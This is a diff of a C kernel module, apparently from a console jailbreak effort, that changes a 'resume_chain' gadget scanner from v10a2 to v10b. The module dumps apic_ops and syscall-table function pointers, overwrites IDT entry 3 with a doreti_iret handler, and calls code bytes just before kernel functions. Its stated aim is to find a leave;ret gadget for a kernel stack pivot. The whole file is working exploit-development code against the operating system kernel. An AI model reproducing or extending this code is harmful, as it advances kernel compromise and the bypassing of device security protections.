@@ -1,45 +1,46 @@
 #include <stdint.h>
 
 /*
- * resume_chain v10a2 — fn-2/fn-3 probe for leave;ret gadget discovery
+ * resume_chain v10b — apic_ops + sysent gadget scanner
  *
  * INT3 (CC) during LAPIC resume is BROKEN (v3, v9a both failed).
  * Alternative: find a leave;ret (C9 C3) gadget for stack pivot.
  *
- * For entries where fn-1 = C3 (ret), fn-2 might be C9 (leave).
- * If so, calling fn-2 executes leave;ret → RSP=RBP → stack pivot.
+ * apic_ops (28 entries) exhausted — all fn-1=C3 have fn-2=48 (REX.W).
+ * Sony Clang consistently uses 48 C3 epilogues. Expanding to sysent
+ * (678 entries, ~150 unique functions) for broader coverage.
  *
  * fw_ver encoding:
- *   0xCC00 + entry_index → probe fn-3 of that apic_ops entry
- *   0xDD00 + entry_index → probe fn-2 of that apic_ops entry
- *   0xEE00 + entry_index → probe fn-1 (v8f mode, for reference)
+ *   apic_ops modes (backward-compatible):
+ *     0xCC00 + idx → probe fn-3 of apic_ops[idx]
+ *     0xDD00 + idx → probe fn-2 of apic_ops[idx]
+ *     0xEE00 + idx → probe fn-1 of apic_ops[idx]
+ *
+ *   sysent fn-1 modes (pages of 256):
+ *     0xAA00 + idx → sysent[idx] fn-1        (entries 0-255)
+ *     0xAB00 + idx → sysent[256+idx] fn-1     (entries 256-511)
+ *     0xAC00 + idx → sysent[512+idx] fn-1     (entries 512-677)
+ *
+ *   sysent fn-2 modes:
+ *     0xBA00 + idx → sysent[idx] fn-2
+ *     0xBB00 + idx → sysent[256+idx] fn-2
+ *     0xBC00 + idx → sysent[512+idx] fn-2
  *
  * Output layout (64 uint64_t slots):
  *   out[0]     = MAGIC (lo32) + status (hi32)
  *   out[1]     = kdata_base
  *   out[2]     = ktext_base
  *   out[3]     = td_pcb
- *   out[4..31] = apic_ops fn ptrs
+ *   out[4..31] = apic_ops fn ptrs (always dumped)
  *   out[32]    = step progress
- *   out[33]    = target entry index
+ *   out[33]    = target index (real sysent idx for sysent modes)
  *   out[34]    = target fn ptr
- *   out[35]    = probe address (fn-2 or fn-1)
+ *   out[35]    = probe address (fn - offset)
  *   out[36]    = call result (RAX after call)
- *   out[37]    = verdict: 0=unknown, 1=changed(executed), 2=sentinel(ret), 3=faulted
- *   out[38]    = probe type (1=fn-1, 2=fn-2)
+ *   out[37]    = verdict: 0=unknown, 1=changed, 2=sentinel(ret), 3=faulted
+ *   out[38]    = probe offset (1=fn-1, 2=fn-2, 3=fn-3)
+ *   out[39]    = source (0=apic_ops, 1=sysent)
  *   out[63]    = end marker
- *
- * Key entries to probe fn-2 (where fn-1 = C3):
- *   [2]  xapic_mode    ktext+0x294340  fn-1=C3  fn-2=?
- *   [14] set_lvt_mode  ktext+0x28E700  fn-1=C3  fn-2=?
- *
- * Possible fn-2 outcomes:
- *   C9 (leave) → leave;ret → stack pivot, crash (RBP unknown)
- *   48 (REX.W) → REX.W ret → clean return (sentinel unchanged)
- *   5D (pop rbp) → pop rbp; ret → pops return addr into RBP, wild ret
- *   CC (INT3) → doreti_iret catches → fn-1=C3=ret → clean return
- *   90 (NOP) → falls through to C3=ret → clean return
- *   other → #UD/#GP → crash
  *
  * Magic written EARLY so kldload can read partial output on crash.
  */
@@ -52,6 +53,11 @@
 #define OFF_DORETI_IRET  (-0x9cf84c)
 #define IDT_ENTRY_SIZE   16
 #define APIC_OPS_COUNT   28
+
+#define OFF_SYSENT       0x1709c0
+#define SYSENT_STRIDE    0x30
+#define SYSENT_FUNC_OFF  0x08
+#define NUM_SYSCALLS     678
 
 #define TD_PCB           0x3f8
 #define PCB_ONFAULT      0x108
@@ -123,9 +129,6 @@ static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t i
  * Call target address with sentinel in RAX.
  * Returns RAX value after the call.
  * pcb_onfault armed for #PF recovery.
- *
- * NOTE: If target is leave;ret (C9 C3), this function will NOT return
- * normally — RSP gets pivoted. The caller should write magic EARLY.
  */
 static uint64_t probe_call(uint64_t target, uint64_t onfault_addr)
 {
@@ -162,16 +165,27 @@ int module_start(kproc_args *args)
 
     uint16_t mode_prefix = (fw_ver >> 8) & 0xFF;
     int target_idx = (int)(fw_ver & 0xFF);
-    int probe_offset;  /* how many bytes before fn to probe */
+    int probe_offset;
+    int use_sysent = 0;
+    int sysent_page = 0;
 
+    /* Parse mode */
     if (mode_prefix == 0xDD) {
-        probe_offset = 2;  /* fn-2 probe */
+        probe_offset = 2;  /* apic_ops fn-2 */
     } else if (mode_prefix == 0xEE) {
-        probe_offset = 1;  /* fn-1 probe (v8f compatible) */
+        probe_offset = 1;  /* apic_ops fn-1 */
     } else if (mode_prefix == 0xCC) {
-        probe_offset = 3;  /* fn-3 probe (looking for C9 before 48 C3) */
+        probe_offset = 3;  /* apic_ops fn-3 */
+    } else if (mode_prefix >= 0xAA && mode_prefix <= 0xAC) {
+        probe_offset = 1;  /* sysent fn-1 */
+        use_sysent = 1;
+        sysent_page = mode_prefix - 0xAA;
+    } else if (mode_prefix >= 0xBA && mode_prefix <= 0xBC) {
+        probe_offset = 2;  /* sysent fn-2 */
+        use_sysent = 1;
+        sysent_page = mode_prefix - 0xBA;
     } else {
-        /* Unknown mode — clear and report */
+        /* Unknown mode */
         for (int i = 0; i < 64; i++) out[i] = 0;
         out[1] = kdata_base;
         out[3] = fw_ver;
@@ -193,18 +207,12 @@ int module_start(kproc_args *args)
 
     /* Write magic EARLY for crash-safe readback */
     out[38] = probe_offset;
-    out32[1] = 0x010A;  /* v10a in-progress */
+    out[39] = use_sysent;
+    out32[1] = 0x010B;  /* v10b in-progress */
     __asm__ volatile("mfence" ::: "memory");
     out32[0] = MAGIC_RSCN;
 
     out[32] = 0x01;  /* step: starting */
-
-    /* Validate target index */
-    if (target_idx >= APIC_OPS_COUNT) {
-        out[33] = target_idx;
-        out32[1] = 0x00FE;
-        return 0;
-    }
 
     /* Get curthread → td_pcb → onfault_addr */
     uint64_t curthread;
@@ -219,17 +227,49 @@ int module_start(kproc_args *args)
 
     uint64_t onfault_addr = td_pcb + PCB_ONFAULT;
 
-    /* Read all 28 fn ptrs from kdata (proven safe) */
+    /* Always dump apic_ops fn ptrs (for reference) */
     uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
     for (int i = 0; i < APIC_OPS_COUNT; i++)
         out[4 + i] = read8(apic_ops_addr + i * 8);
 
     out[32] = 0x02;  /* step: fn ptrs read */
 
-    /* Get target fn ptr */
-    uint64_t fn = out[4 + target_idx];
-    out[33] = target_idx;
-    out[34] = fn;
+    /* Resolve target fn ptr */
+    uint64_t fn = 0;
+
+    if (use_sysent) {
+        int real_idx = sysent_page * 256 + target_idx;
+
+        if (real_idx >= NUM_SYSCALLS) {
+            out[33] = real_idx;
+            out32[1] = 0x00FE;
+            return 0;
+        }
+
+        uint64_t sysent_base = kdata_base + OFF_SYSENT;
+        fn = read8(sysent_base + (uint64_t)real_idx * SYSENT_STRIDE + SYSENT_FUNC_OFF);
+        out[33] = real_idx;
+        out[34] = fn;
+
+        /* Validate fn is in ktext range */
+        if (fn < ktext_base || fn >= ktext_base + 0xC00000) {
+            out[35] = 0;
+            out[37] = 0;
+            out32[1] = 0x01F1;  /* fn outside ktext */
+            return 0;
+        }
+    } else {
+        /* apic_ops mode */
+        if (target_idx >= APIC_OPS_COUNT) {
+            out[33] = target_idx;
+            out32[1] = 0x00FE;
+            return 0;
+        }
+
+        fn = out[4 + target_idx];
+        out[33] = target_idx;
+        out[34] = fn;
+    }
 
     if (fn == 0) {
         out[35] = 0;
@@ -247,19 +287,17 @@ int module_start(kproc_args *args)
     uint64_t idt3_orig_lo = read8(idt3_addr);
     uint64_t idt3_orig_hi = read8(idt3_addr + 8);
 
-    /* Set IDT[3] = doreti_iret, IST=0 (catches INT3 if fn-2 = CC) */
+    /* Set IDT[3] = doreti_iret, IST=0 (catches INT3 if probe hits CC) */
     uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
     idt_set_handler(idt3_addr, doreti_iret, 0);
 
     out[32] = 0x03;  /* step: IDT[3] armed */
 
     /* === SINGLE PROBE === */
-    out[32] = 0x100 + target_idx;  /* step: probing */
+    out[32] = 0x100 + (use_sysent ? (sysent_page * 256 + target_idx) : target_idx);
 
     uint64_t result = probe_call(probe_addr, onfault_addr);
     out[36] = result;
-
-    /* If we get here, the call returned (didn't crash/pivot) */
 
     /* Classify result */
     if (result == SENTINEL) {
@@ -267,7 +305,7 @@ int module_start(kproc_args *args)
     } else if (result == 0xFAFAFAFAFAFAFAFAULL) {
         out[37] = 3;  /* faulted (#PF caught by pcb_onfault) */
     } else {
-        out[37] = 1;  /* RAX changed: function executed (CC→fn or other) */
+        out[37] = 1;  /* RAX changed: function executed */
     }
 
     /* Restore original IDT[3] */
@@ -276,10 +314,10 @@ int module_start(kproc_args *args)
 
     out[32] = 0x04;  /* step: complete */
 
-    out[63] = 0xdeadbeefcafe010AULL;
+    out[63] = 0xdeadbeefcafe010BULL;
 
     /* Update magic with completion status */
-    out32[1] = 0x110A;  /* v10a complete */
+    out32[1] = 0x110B;  /* v10b complete */
 
     return 0;
 }
